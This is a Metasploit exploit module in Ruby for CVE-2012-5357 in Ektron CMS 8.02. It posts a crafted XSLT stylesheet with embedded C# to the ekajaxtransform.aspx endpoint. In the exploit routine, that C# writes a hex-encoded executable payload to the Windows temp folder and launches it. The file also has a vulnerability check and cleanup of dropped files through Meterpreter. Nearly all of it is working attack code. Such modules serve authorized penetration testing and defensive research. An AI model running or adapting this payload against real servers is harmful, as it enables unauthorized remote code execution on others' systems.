##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/exploit/file_dropper'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE
	include Msf::Exploit::FileDropper

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Ektron 8.02 XSLT Transform Remote Code Execution',
			'Description'    => %q{
					This module exploits a vulnerability in Ektron CMS 8.02 (before SP5). The
				vulnerability exists due to the insecure usage of XslCompiledTransform, using a
				XSLT controlled by the user. The module has been tested successfully on Ektron CMS
				8.02 over Windows 2003 SP2, which allows to execute arbitrary code with NETWORK
				SERVICE privileges.
			},
			'Author'         => [
				'Unknown', # Vulnerability discovery, maybe Richard Lundeen from http://webstersprodigy.net/ ?
				'juan vazquez' # Metasploit module
			],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2012-5357'],
					[ 'URL', 'http://webstersprodigy.net/2012/10/25/cve-2012-5357cve-1012-5358-cool-ektron-xslt-rce-bugs/' ],
					[ 'URL', 'http://technet.microsoft.com/en-us/security/msvr/msvr12-016' ]
				],
			'Payload'        =>
				{
					'Space'           => 2048,
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Privileged'     => true,
			'Targets'        =>
				[
					['Windows 2003 SP2 / Ektron CMS400 8.02', { }],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 16 2012'
		))

		register_options(
			[
				OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the VBS payload request', 60]),
				OptString.new('TARGETURI', [true, 'The URI path of the Ektron CMS', '/cms400min/'])
			], self.class )
	end

	def check

		fingerprint = rand_text_alpha(5 + rand(5))
		xslt_data = <<-XSLT
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string xml()
{
return "#{fingerprint}";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
		XSLT

		res = send_request_cgi(
			{
				'uri'     => "#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx",
				'version' => '1.1',
				'method'  => 'POST',
				'ctype'   => "application/x-www-form-urlencoded; charset=UTF-8",
				'headers' => {
					"Referer" => build_referer
				},
				'vars_post'    => {
					"xml" => rand_text_alpha(5 + rand(5)),
					"xslt" => xslt_data
				}
			})

		if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end


	def on_new_session(session)
		if session.type == "meterpreter"
			session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
		end

		@dropped_files.delete_if do |file|
			win_file = file.gsub("/", "\\\\")
			if session.type == "meterpreter"
				begin
					windir = session.fs.file.expand_path("%WINDIR%")
					win_file = "#{windir}\\Temp\\#{win_file}"
					# Meterpreter should do this automatically as part of
					# fs.file.rm().  Until that has been implemented, remove the
					# read-only flag with a command.
					session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
					session.fs.file.rm(win_file)
					print_good("Deleted #{file}")
					true
				rescue ::Rex::Post::Meterpreter::RequestError
					print_error("Failed to delete #{win_file}")
					false
				end

			end
		end

	end

	def uri_path
		uri_path = target_uri.path
		uri_path << "/" if uri_path[-1, 1] != "/"
		uri_path
	end

	def build_referer
		if datastore['SSL']
			schema = "https://"
		else
			schema = "http://"
		end

		referer = schema
		referer << rhost
		referer << ":#{rport}"
		referer << uri_path
		referer
	end

	def exploit

		print_status("Generating the EXE Payload and the XSLT...")
		exe_data = generate_payload_exe
		exe_string = Rex::Text.to_hex(exe_data)
		exename = rand_text_alpha(5 + rand(5))
		fingerprint = rand_text_alpha(5 + rand(5))
		xslt_data = <<-XSLT
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string xml()
{
char[] charData = "#{exe_string}".ToCharArray();
string fileName = @"C:\\windows\\temp\\#{exename}.txt";
System.IO.FileStream fs = new System.IO.FileStream(fileName, System.IO.FileMode.Create);
System.IO.BinaryWriter bw = new System.IO.BinaryWriter(fs);
for (int i = 0; i < charData.Length; i++)
{
	bw.Write( (byte) charData[i]);
}
bw.Close();
fs.Close();
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.FileName = @"C:\\windows\\temp\\#{exename}.txt";
p.Start();
return "#{fingerprint}";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
		XSLT

		print_status("Trying to run the xslt transformation...")
		res = send_request_cgi(
			{
				'uri'     => "#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx",
				'version' => '1.1',
				'method'  => 'POST',
				'ctype'   => "application/x-www-form-urlencoded; charset=UTF-8",
				'headers' => {
					"Referer" => build_referer
				},
				'vars_post'    => {
					"xml" => rand_text_alpha(5 + rand(5)),
					"xslt" => xslt_data
				}
			})
		if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/
			print_good("Exploitation was successful")
			register_file_for_cleanup("#{exename}.txt")
		else
			fail_with(Exploit::Failure::Unknown, "There was an unexpected response to the xslt transformation request")
		end

	end
end
